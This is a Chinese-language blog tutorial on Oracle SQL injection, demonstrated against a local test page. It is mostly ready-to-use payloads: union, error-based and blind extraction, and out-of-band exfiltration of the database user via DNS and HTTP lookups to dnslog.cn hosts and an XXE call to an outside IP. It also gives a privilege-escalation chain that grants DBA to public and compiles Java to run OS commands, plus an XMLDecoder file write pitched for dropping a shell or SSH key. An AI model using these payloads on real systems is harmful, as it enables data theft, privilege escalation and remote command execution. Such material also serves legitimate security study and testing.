---
title: "Oracle SQL注入学习"
date: 2020-03-18T20:58:02+08:00
draft: false
tags:
- 注入
- Oracle
series:
-
categories:
- 渗透测试
---

Oracle注入
<!--more-->
## 基本概念
Oracle和MySQL数据库语法大致相同，结构不太相同。**最大的一个特点就是oracle可以调用Java代码。**

对于“数据库”这个概念而言，Oracle采用了”表空间“的定义。数据文件就是由多个表空间组成的，这些数据文件和相关文件形成一个完整的数据库。当数据库创建时，Oracle 会默认创建五个表空间：SYSTEM、SYSAUX、USERS、UNDOTBS、TEMP：
1. SYSTEM：看名字就知道这个用于是存储系统表和管理配置等基本信息
2. SYSAUX：类似于 SYSTEM，主要存放一些系统附加信息，以便减轻 SYSTEM 的空间负担
3. UNDOTBS：用于事务回退等
4. TEMP：作为缓存空间减少内存负担
5. USERS：就是存储我们定义的表和数据

在Oracle中每个表空间中均存在一张dual表，这个表是虚表，并没有实际的存储意义，它永远只存储一条数据，因为Oracle的SQL语法要求select后必须跟上from，所以我们通常使用dual来作为计算、查询时间等SQL语句中from之后的虚表占位，也就是`select 1+1 from dual`。

再来看Oracle中用户和权限划分：Oracle 中划分了许多用户权限，权限的集合称为角色。例如 CONNECT 角色具有连接到数据库权限，RESOURCE 能进行基本的增删改查，DBA 则集合了所有的用户权限。在创建数据库时，会默认启用 sys、system 等用户：
1. sys：相当于 Linux 下的 root 用户。为 DBA 角色
2. system：与 sys 类似，但是相对于 sys 用户，无法修改一些关键的系统数据，这些数据维持着数据库的正常运行。为 DBA 角色。
3. public：public 代指所有用户（everyone），对其操作会应用到所有用户上（实际上是所有用户都有 public 用户拥有的权限，如果将 DBA 权限给了 public，那么也就意味着所有用户都有了 DBA 权限）

## 基本语法
```sql
select column, group_function(column)
from table
[where condition]
[group by group_by_expression]
[having group_condition]
[order by column];
```
Oracle要求select后必须指明要查询的表名，可以用dual。

Oracle使用 `||` 拼接字符串，MySQL中为或运算。
![image](https://y4er.com/img/uploads/20200318219990.png)

单引号和双引号在Oracle中虽然都是字符串，但是双引号可以用来消除关键字，比如`sysdate`。

Oracle中limit应该使用虚表中的rownum字段通过where条件判断。
![image](https://y4er.com/img/uploads/20200318214341.png)

Oracle中没有空字符，`''`和'null'都是null，而MySQL中认为`''`仍然是一个字符串。

Oracle对数据格式要求严格，比如`union select`的时候，放到下文讲。

Oracle的系统表：
- dba_tables : 系统里所有的表的信息，需要DBA权限才能查询
- all_tables : 当前用户有权限的表的信息
- user_tables: 当前用户名下的表的信息
- DBA_ALL_TABLES：DBA 用户所拥有的或有访问权限的对象和表
- ALL_ALL_TABLES：某一用户拥有的或有访问权限的对象和表
- USER_ALL_TABLES：某一用户所拥有的对象和表

**DBA_TABLES >= ALL_TABLES >= USER_TABLES**

## 信息收集
从现在开始，我们以注入点`http://localhost:8080/oracleInject/index?username=admin`为例讲解。代码随便写一个jsp网页就行了。

![image](https://y4er.com/img/uploads/20200318212378.png)

获取数据库版本信息
```
http://localhost:8080/oracleInject/index?username=admin' union select 1,'a',(SELECT banner FROM v$version WHERE banner LIKE 'Oracle%25') from dual -- +
```
![image](https://y4er.com/img/uploads/20200318218628.png)

获取操作系统版本信息
```
http://localhost:8080/oracleInject/index?username=admin' union select 1,'a',(SELECT banner FROM v$version where banner like 'TNS%25') from dual -- +
```
![image](https://y4er.com/img/uploads/20200318214842.png)

获取当前数据库
```
http://localhost:8080/oracleInject/index?username=admin' union select 1,'a',(SELECT name FROM v$database) from dual -- +
```
![image](https://y4er.com/img/uploads/20200318218985.png)

获取数据库用户
```sql
SELECT user FROM dual;
```
获取所有数据库用户
```sql
SELECT username FROM all_users;
SELECT name FROM sys.user$; -- 需要高权限
```
获取当前用户权限
```sql
SELECT * FROM session_privs
```
获取当前用户有权限的所有数据库
```sql
SELECT DISTINCT owner, table_name FROM all_tables
```
![image](https://y4er.com/img/uploads/20200318214705.png)

获取表，all_tables类似于MySQL中的information_schema.tables，里面的结构可以自己构造sql语句。
```sql
SELECT * FROM all_tables;
```
![image](https://y4er.com/img/uploads/20200318213870.png)

获取字段名
```sql
SELECT column_name FROM all_tab_columns
```
![image](https://y4er.com/img/uploads/20200318210974.png)

在Oracle启动时，在 userenv 中存储了一些系统上下文信息，通过 SYS_CONTEXT 函数，我们可以取回相应的参数值。包括当前用户名等等。
```sql
SELECT SYS_CONTEXT（'USERENV'，'SESSION_USER'） from dual;
```
更多可用参数说明可以查阅 Oracle 提供的文档：[SYS_CONTEXT](https://docs.oracle.com/cd/B19306_01/server.102/b14200/functions165.htm)

## 注入类型
### 联合查询
order by 猜字段数量，union select进行查询，需要注意的是每一个字段都需要对应前面select的数据类型(字符串/数字)。所以我们一般先使用null字符占位，然后逐位判断每个字段的类型，比如：
```sql
http://localhost:8080/oracleInject/index?username=admin' union select null,null,null from dual -- 正常
http://localhost:8080/oracleInject/index?username=admin' union select 1,null,null from dual -- 正常说明第一个字段是数字型
http://localhost:8080/oracleInject/index?username=admin' union select 1,2,null from dual -- 第二个字段为数字时错误
http://localhost:8080/oracleInject/index?username=admin' union select 1,'asd',null from dual -- 正常 为字符串 依此类推
```
查数据库版本和用户名
```
http://localhost:8080/oracleInject/index?username=admin' union select 1,(select user from dual),(SELECT banner FROM v$version where banner like 'Oracle%25') from dual -- 
```
查当前数据库
```
http://localhost:8080/oracleInject/index?username=admin' union select 1,(SELECT global_name FROM global_name),null from dual -- 
```
查表，wmsys.wm_concat()等同于MySQL中的group_concat()，在11gr2和12C上已经抛弃，可以用LISTAGG()替代
```
http://localhost:8080/oracleInject/index?username=admin' union select 1,(select LISTAGG(table_name,',')within group(order by owner)name from all_tables where owner='SYSTEM'),null from dual -- 
```
![image](https://y4er.com/img/uploads/20200318212695.png)
但是LISTAGG()返回的是varchar类型，如果数据表很多会出现字符串长度过长的问题。这个时候可以使用通过字符串截取来进行。

查字段
```
http://localhost:8080/oracleInject/index?username=admin' union select 1,(select column_name from all_tab_columns where table_name='TEST' and rownum=2),null from dual -- 
```

有表名字段名出数据就不说了。

## 报错注入
### utl_inaddr.get_host_name
```sql
select utl_inaddr.get_host_name((select user from dual)) from dual;
```
11g之后，使用此函数的数据库用户需要有访问网络的权限
### ctxsys.drithsx.sn
```sql
select ctxsys.drithsx.sn(1, (select user from dual)) from dual;
```
处理文本的函数，参数错误时会报错。
### CTXSYS.CTX_REPORT.TOKEN_TYPE
```sql
select CTXSYS.CTX_REPORT.TOKEN_TYPE((select user from dual), '123') from dual;
```
### XMLType
我在12c中测试失败。
```
http://localhost:8080/oracleInject/index?username=admin' and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null --
```
注意url编码，如果返回的数据有空格的话，它会自动截断，导致数据不完整，这种情况下先转为 hex，再导出。

### dbms_xdb_version.checkin
```sql
select dbms_xdb_version.checkin((select user from dual)) from dual;
```
### dbms_xdb_version.makeversioned
```sql
select dbms_xdb_version.makeversioned((select user from dual)) from dual;
```
### dbms_xdb_version.uncheckout
```sql
select dbms_xdb_version.uncheckout((select user from dual)) from dual;
```
### dbms_utility.sqlid_to_sqlhash
```sql
SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual;
```
### ordsys.ord_dicom.getmappingxpath
```sql
select ordsys.ord_dicom.getmappingxpath((select user from dual), 1, 1) from dual;
```
### UTL_INADDR.get_host_name
```sql
select UTL_INADDR.get_host_name((select user from dual)) from dual;
```
### UTL_INADDR.get_host_address
```sql
select UTL_INADDR.get_host_name('~'||(select user from dual)||'~') from dual;
```

## 盲注
### 布尔盲注
布尔盲注第一种是可以使用简单的字符串比较来进行，比如：
```sql
http://localhost:8080/oracleInject/index?username=admin' and (select substr(user, 1, 1) from dual)='S' --
```
然后还有一种是通过decode配合除数为0来进行布尔盲注。
```sql
http://localhost:8080/oracleInject/index?username=admin' and 1=(select decode(substr(user, 1, 1), 'S', (1/1),0) from dual) --
```
### 时间盲注
1. 大量数据
```sql
select count(*) from all_objects
```
缺点就是不准。

2. 时间延迟函数
```sql
select 1 from dual where DBMS_PIPE.RECEIVE_MESSAGE('asd', REPLACE((SELECT substr(user, 1, 1) FROM dual), 'S', 10))=1;
```
![image](https://y4er.com/img/uploads/20200318214321.png)
还可以配合decode
```sql
select decode(substr(user,1,1),'S',dbms_pipe.receive_message('RDS',10),0) from dual;
```

## 带外OOB
类似于MySQL load_file的带外盲注。OOB 都需要发起网络请求的权限，有限制。

### utl_http.request
需要出外网HTTP
![image](https://y4er.com/img/uploads/20200318210020.png)

### utl_inaddr.get_host_address
dns解析带外
```sql
select utl_inaddr.get_host_address((select user from dual)||'.cbb1ya.dnslog.cn') from dual
```
![image](https://y4er.com/img/uploads/20200318215662.png)
### SYS.DBMS_LDAP.INIT
**这个函数在 10g/11g 中是 public 权限.**
```sql
SELECT DBMS_LDAP.INIT((select user from dual)||'.24wypw.dnslog.cn',80) FROM DUAL;
```
### HTTPURITYPE
```sql
SELECT HTTPURITYPE((select user from dual)||'.24wypw.dnslog.cn').GETCLOB() FROM DUAL;
```
### 其他
如果 Oracle 版本 <= 10g，可以尝试以下函数：
1. UTL_INADDR.GET_HOST_ADDRESS
2. UTL_HTTP.REQUEST
3. HTTP_URITYPE.GETCLOB
4. DBMS_LDAP.INIT and UTL_TCP

## Oracle XXE (CVE-2014-6577)
说是xxe，实际上应该算是利用xml的加载外部文档来进行数据带外。支持http和ftp
1. http
```sql
select 1 from dual where 1=(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://192.168.124.1/'||(SELECT user from dual)||'"> %remote;]>'),'/l') from dual); 
```

2. ftp
```sql
select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "ftp://'||user||':bar@IP/test"> %remote; %param1;]>'),'/l') from dual;
```

## 提权
前文说了Oracle可以调用Java程序

### GET_DOMAIN_INDEX_TABLES函数注入
影响版本:Oracle 8.1.7.4, 9.2.0.1 - 9.2.0.7, 10.1.0.2 - 10.1.0.4, 10.2.0.1-10.2.0.2

漏洞的成因是该函数的参数存在注入，而该函数的所有者是sys，所以通过注入就可以执行任意sql，该函数的执行权限为public，所以只要遇到一个oracle的注入点并且存在这个漏洞的，基本上都可以提升到最高权限。

1. 权限提升
```sql
http://localhost:8080/oracleInject/index?username=admin' and (SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS _OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant dba to public'''';END;'';END;--','SYS',0,'1',0)) is not null--
```
2. 创建Java代码执行命令
```sql
http://localhost:8080/oracleInject/index?username=admin' and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace and compile java source named "Command" as import java.io.*;public class Command{public static String exec(String cmd) throws Exception{String sb="";BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());BufferedReader inBr = new BufferedReader(new InputStreamReader(in));String lineStr;while ((lineStr = inBr.readLine()) != null)sb+=lineStr+"\n";inBr.close();in.close();return sb;}}'''';END;'';END;--','SYS',0,'1',0) from dual) is not null --
```

3. 赋予Java执行权限
```sql
http://localhost:8080/oracleInject/index?username=admin' and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission( ''''''''PUBLIC'''''''', ''''''''SYS:java.io.FilePermission'''''''', ''''''''<<ALL FILES>>'''''''', ''''''''execute'''''''' );end;'''';END;'';END;--','SYS',0,'1',0) from dual) is not null --
```

4. 创建函数
```sql
http://localhost:8080/oracleInject/index?username=admin' and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function cmd(p_cmd in varchar2) return varchar2 as language java name ''''''''Command.exec(java.lang.String) return String''''''''; '''';END;'';END;--','SYS',0,'1',0) from dual) is not null --
```

5. 赋予函数执行权限
```sql
http://localhost:8080/oracleInject/index?username=admin' and (select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on cmd to public'''';END;'';END;--','SYS',0,'1',0) from dual) is not null--
```

6. 执行命令
```sql
http://localhost:8080/oracleInject/index?username=admin' and (select sys.cmd('cmd.exe /c whoami') from dual) is not null--
```
### DBMS_JVM_EXP_PERMS绕过JVM执行命令
移步：
1. https://www.notsosecure.com/hacking-oracle-11g/
2. https://www.exploit-db.com/exploits/33601

### xml反序列化绕过JVM执行命令 CVE-2018-3004
如果当前数据库用户具有connect和resource权限，则可以尝试使用反序列化来进行执行命令。Oracle Enterprise Edition 有一个嵌入数据库的Java虚拟机，而Oracle数据库则通过Java存储过程来支持Java的本地执行。
```sql
--create or replace function get_java_property(prop in varchar2) return varchar2
--   is language java name 'java.lang.System.getProperty(java.lang.String) return java.lang.String';
--/
select get_java_property('java.version') from dual;
```
![image](https://y4er.com/img/uploads/20200318214591.png)

**原作者写的是`java.name.System`，这里应该使用`java.lang.System`**

虽然你以为可以执行Java代码了，直接冲Runtime.getRuntime().exec()就完事了，但是实际上Oracle对权限进行了细致的划分，并不能直接冲。我们可以用一个xml的反序列化来冲。
```sql
BEGIN
 decodeme('<?xml version="1.0" encoding="UTF-8" ?>
<java version="1.4.0" class="java.beans.XMLDecoder"> 
<object class="java.io.FileWriter">
                      <string>c:\\app\\1.txt</string>
                      <boolean>True</boolean>
                      <void method="write">
                         <string>aaa</string>
                      </void>
                      <void method="close" />
                   </object>
</java>');
END;
/
```
试了试好像不能执行命令，但是可以写文件。写个shell还是绰绰有余的，当然你还可以写ssh公钥。
![image](https://y4er.com/img/uploads/20200318219965.png)

## 参考
1. https://www.iswin.org/2015/06/13/hack-oracle
2. http://obtruse.syfrtext.com/2018/07/oracle-privilege-escalation-via.html?m=1
3. https://www.cnblogs.com/-qing-/p/10949562.html
4. [Oracle 注入指北](https://www.tr0y.wang/2019/04/16/Oracle%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/index.html)
5. https://www.notsosecure.com/hacking-oracle-11g/


**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**